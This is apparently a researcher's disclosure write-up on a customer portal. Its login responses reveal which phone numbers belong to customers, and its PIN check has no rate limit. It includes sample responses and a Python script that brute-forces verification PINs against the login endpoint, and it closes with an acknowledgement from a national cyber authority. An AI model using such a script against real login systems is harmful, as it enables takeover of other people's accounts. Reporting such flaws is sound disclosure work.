# The research goal
## tl;dr
Found a vulnerabiility to login into any customer portal, and while exploiting the vulnerabiility for POC, I discovered an anomaly enabling me to discover all the company customers.<br>
Meaning, me being able to login into any of the company customers accounts
<br>
I will start from the second vulnerability since the explotation needs this order.


## The research
###  CWE-204: Observable Response Discrepancy
Whlile exploiting another vulnerability, I noticed I get a different response whether the input belongs to the company client, or not:<br>

* Invalid user:
```json
{'status': {'isError': True, 'code': 422, 'text': 'Invalid data', 'message': 'Invalid input'}, 'data':
{'phone_number': 'לא ניתן להתחבר עם מספר זה'}})
```
* valid user:
```json
{"status":{"isError":false,"code":200,"text":"Ok","message":"Ok"},"data":""}
```
Cool! We can detect all the company clients using enumeration!


### CWE-307: Improper Restriction of Excessive Authentication
After we found a company client, we would like to login into their account!<br>

The company didn't enforce a rate limit defense mechanism but added a custom security code.
However, they don't make sure it's used only serveral times, to I managed to use one token to the whole attack.<br>


```python
async def try_pin_code(phone_number, pin_code, session):
    company_url = "https://<company-domain>/index.php?option=<censored>&task=user.loginConfirm&format=raw"
    cookies = {
        'ea665a87302479a2702d938bca74ec90': '<CSRF_TOKEN_USED_MULTIPLE_TIMES>',
    }

    data = {
        'verification_code': pin_code,
        '<company>SecurityToken': '<censored>',
        'googleAnalyticsClientId': 'false'
    }

    async with session.post(company_url, cookies=cookies, data=data) as resp:
        try:
            json_response = await resp.json()
        except aiohttp.client_exceptions.ContentTypeError:
            text = await resp.text()
            try:
                json_response = json.loads(text)
            except json.decoder.JSONDecodeError:
                print('FAILED', text)
                return

    print(phone_number, pin_code, json_response)
    if not json_response.get('status').get('isError'):
        print('MATCH')
        exit(0)
```
 Using this brute force script, I managed to login to every company user.


 # INCD Resposne
```
 תודה על פנייתך, הנושא הועבר לגורמים הרלוונטיים. 
```